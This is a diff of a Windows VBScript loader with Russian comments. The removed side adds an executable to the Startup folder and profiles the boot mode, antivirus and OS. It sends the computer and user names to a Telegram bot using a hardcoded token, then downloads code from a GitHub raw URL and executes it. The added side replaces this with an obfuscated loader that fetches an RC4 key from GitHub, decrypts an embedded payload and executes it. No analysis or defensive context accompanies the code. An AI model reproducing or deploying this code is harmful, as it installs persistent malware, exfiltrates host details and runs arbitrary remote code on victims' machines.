@@ -1,163 +1,112 @@
-' ===== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА =====
-Set oShell = CreateObject("WScript.Shell")
-strCommand = "%COMSPEC% /c net session >nul 2>&1"
-iReturnCode = oShell.Run(strCommand, 0, True)
-
-If iReturnCode <> 0 Then
-    WScript.Quit
-End If
-
-Set oShell = Nothing
-
-
-' ===== ДОБАВЛЕНИЕ EXE В АВТОЗАГРУЗКУ =====
-Dim objAutoShell, strLocalAppDataPath, strExePath, strStartupFolderPath
-Set objFileSystemObject = CreateObject("Scripting.FileSystemObject")
-Set objAutoShell = CreateObject("WScript.Shell")
-strLocalAppDataPath = objAutoShell.ExpandEnvironmentStrings("%LocalAppData%")
-strExePath = strLocalAppDataPath & "\1446062403_key.exe"
-
-If objFileSystemObject.FileExists(strExePath) Then
-    strStartupFolderPath = objAutoShell.SpecialFolders("Startup") & "\1446062403_key.exe"
-    If Not objFileSystemObject.FileExists(strStartupFolderPath) Then
-        objFileSystemObject.CopyFile strExePath, strStartupFolderPath
-    End If
-End If
-
-Set objAutoShell = Nothing
-
-
-' ===== ОПРЕДЕЛЕНИЕ BIOS/UEFI, АНТИВИРУСА, ВЕРСИИ WINDOWS =====
-Set objShell = CreateObject("WScript.Shell")
-objShell.CurrentDirectory = "C:\Windows\System32"
-
-mountResult = objShell.Run("cmd /c mountvol S: /S", 0, True)
-bcdeditResult = objShell.Run("cmd /c bcdedit /enum | find ""path"" | find ""bootmgfw.efi""", 0, True)
-If mountResult = 0 And bcdeditResult = 0 Then
-    biosResult = "Система работает в режиме UEFI"
-Else
-    biosResult = "Система работает в режиме BIOS (Legacy)"
-End If
-If mountResult = 0 Then
-    objShell.Run "cmd /c mountvol S: /D", 0, True
-End If
-
-Set objWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
-Set colItems = objWMI.ExecQuery("SELECT * FROM AntiVirusProduct")
-antivirusName = ""
-For Each objItem In colItems
-    If InStr(LCase(objItem.displayName), "windows defender") = 0 And InStr(LCase(objItem.displayName), "microsoft defender") = 0 Then
-        antivirusName = objItem.displayName
-        Exit For
-    End If
-Next
-If antivirusName = "" Then
-    avResult = "В системе установлен Windows Defender"
-Else
-    avResult = "В системе установлен " & antivirusName
-End If
-
-Set objWMIOS = GetObject("winmgmts:\\.\root\cimv2")
-Set colOS = objWMIOS.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
-winVersion = ""
-For Each objOS In colOS
-    winVersion = objOS.Caption
-    Exit For
-Next
-If winVersion = "" Then
-    winResult = "Версия Windows: не удалось определить"
-Else
-    winResult = "Версия Windows: " & winVersion
-End If
-
-
-' ===== ОТПРАВКА В TELEGRAM =====
-Token = "8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
-ChatID = "7063407604"
-device = objShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
-user = objShell.ExpandEnvironmentStrings("%USERNAME%")
-
-msg = "Устройство: " & device & vbCrLf & _
-      "Пользователь: " & user & vbCrLf & vbCrLf & _
-      biosResult & vbCrLf & _
-      avResult & vbCrLf & _
-      winResult
-
-If Len(msg) > 4090 Then msg = Left(msg, 4090)
-
-msg = Replace(msg, "\", "\\")
-msg = Replace(msg, """", "\""")
-msg = Replace(msg, vbCrLf, "\n")
-msg = Replace(msg, vbCr, "\r")
-msg = Replace(msg, vbLf, "\n")
-msg = Replace(msg, vbTab, "\t")
-body = "{""chat_id"":""" & ChatID & """,""text"":""" & msg & """}"
-url = "https://api.telegram.org/bot" & Token & "/sendMessage"
-
+Option Explicit
+Dim v000:v000="https"&"://"&"github.com/049-bit/K/raw/refs/heads/main/key.txt"
+Dim v001,v002,v003(5)
+v001="Неиспользуемый текст"
+v002=12345
+Dim v004,v005,v006
+v004="jFqjXa62LSI6WR2B9Zo"
+v005="riDSg26U2R25zNwQBtA=="
+v006=v004&v005
+Function f001(v007)
+Dim v008,v009
 On Error Resume Next
-Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-If Err.Number = 0 And Not http Is Nothing Then
-    http.Open "POST", url, False
-    If Err.Number = 0 Then
-        http.setRequestHeader "Content-Type", "application/json"
-        http.Send body
-    End If
+Set v008=CreateObject("WinHttp"&".WinHttpRequest"&".5"&".1")
+If Err.Number<>0 Then
+f001="Ошибка создания WinHttp: "&Err.Description
+Exit Function
 End If
-On Error Goto 0
-
-
-' ===== RAW ССЫЛКИ И ВЫБОР ССЫЛКИ ПО КОНФИГУРАЦИИ =====
-LinkUefiWd = "https://github.com/049-bit/K/raw/refs/heads/main/test.vbs"
-LinkUefiThirdPartyAv = "https://github.com/049-bit/K/raw/refs/heads/main/test.vbs"
-LinkBiosWd = "https://github.com/049-bit/K/raw/refs/heads/main/test.vbs"
-LinkBiosThirdPartyAv = "https://github.com/049-bit/K/raw/refs/heads/main/test.vbs"
-
-isUEFI = (mountResult = 0 And bcdeditResult = 0)
-isWindowsDefender = (antivirusName = "")
-If isUEFI And isWindowsDefender Then
-    cfgUrl = LinkUefiWd
-ElseIf isUEFI And Not isWindowsDefender Then
-    cfgUrl = LinkUefiThirdPartyAv
-ElseIf Not isUEFI And isWindowsDefender Then
-    cfgUrl = LinkBiosWd
+v008.Open "GET",v007,False
+v008.Send
+If Err.Number<>0 Then
+f001="Ошибка запроса: "&Err.Description
+Exit Function
+End If
+If v008.Status=200 Then
+v009=v008.ResponseText
+v009=Trim(v009)
+If Len(v009)<16 Then
+v009=v009&String(16-Len(v009),Chr(0))
+ElseIf Len(v009)>16 Then
+v009=Left(v009,16)
+End If
+f001=v009
 Else
-    cfgUrl = LinkBiosThirdPartyAv
+f001="Ошибка HTTP: "&v008.Status&" "&v008.StatusText
 End If
-
-
-' ===== ФУНКЦИЯ ЗАГРУЗКИ КОДА =====
-Function LoadCodeFromURL(urlCode)
-    Dim httpLoad, code
-    On Error Resume Next
-    Set httpLoad = CreateObject("WinHttp.WinHttpRequest.5.1")
-    If Err.Number <> 0 Then
-        LoadCodeFromURL = ""
-        Exit Function
-    End If
-    
-    httpLoad.Open "GET", urlCode, False
-    httpLoad.Send
-    
-    If Err.Number <> 0 Then
-        LoadCodeFromURL = ""
-        Exit Function
-    End If
-    
-    If httpLoad.Status = 200 Then
-        code = httpLoad.ResponseText
-        code = Trim(code)
-        LoadCodeFromURL = code
-    Else
-        LoadCodeFromURL = ""
-    End If
-    
-    Set httpLoad = Nothing
+Set v008=Nothing
 End Function
-
-
-' ===== ЗАГРУЗКА И ВЫПОЛНЕНИЕ КОДА =====
-remoteCode = LoadCodeFromURL(cfgUrl)
-
-If remoteCode <> "" Then
-    ExecuteGlobal remoteCode
+Class CryptoWrapper
+Private v010
+Private Sub Class_Initialize()
+v010=f001(v000)
+If Left(v010,6)="Ошибка" Then
+MsgBox v010,vbCritical,"Ошибка загрузки ключа"
+WScript.Quit 1
 End If
+End Sub
+Public Function DecodeData(v011)
+Dim v012
+v012=f002(v011)
+v012=f003(v012,v010)
+DecodeData=f004(v012)
+End Function
+Private Function f002(v013)
+Dim v014,v015
+Set v014=CreateObject("MSXML2"&".DOMDocument"&".3"&".0")
+Set v015=v014.CreateElement("tmp")
+v015.DataType="bin"&".base64"
+v015.Text=v013
+f002=v015.nodeTypedValue
+End Function
+Private Function f003(v016,v017)
+Dim v018(255),v019,v020,v021,v022
+Dim v023(),v024
+For v019=0 To 255
+v018(v019)=v019
+Next
+v020=0
+For v019=0 To 255
+v020=(v020+v018(v019)+Asc(Mid(v017,(v019 Mod Len(v017))+1,1)))Mod 256
+v022=v018(v019)
+v018(v019)=v018(v020)
+v018(v020)=v022
+Next
+v019=0:v020=0
+v024=LenB(v016)
+ReDim v023(v024-1)
+For v021=1 To v024
+v019=(v019+1)Mod 256
+v020=(v020+v018(v019))Mod 256
+v022=v018(v019)
+v018(v019)=v018(v020)
+v018(v020)=v022
+Dim v025
+v025=v018((v018(v019)+v018(v020))Mod 256)
+v023(v021-1)=AscB(MidB(v016,v021,1))Xor v025
+Next
+Dim v026
+v026=""
+For v021=0 To v024-1
+v026=v026&ChrB(v023(v021))
+Next
+f003=v026
+End Function
+Private Function f004(v027)
+Dim v028,v029
+v028=""
+For v029=1 To LenB(v027) Step 2
+Dim v030,v031
+v030=AscB(MidB(v027,v029,1))
+v031=AscB(MidB(v027,v029+1,1))
+v028=v028&ChrW(v031*256+v030)
+Next
+f004=v028
+End Function
+End Class
+v003(0)=Now()
+v001=v001&CStr(v002*0)
+Dim v032
+Set v032=New CryptoWrapper
+Dim v033
+v033=v032.DecodeData(v006)
+ExecuteGlobal v033
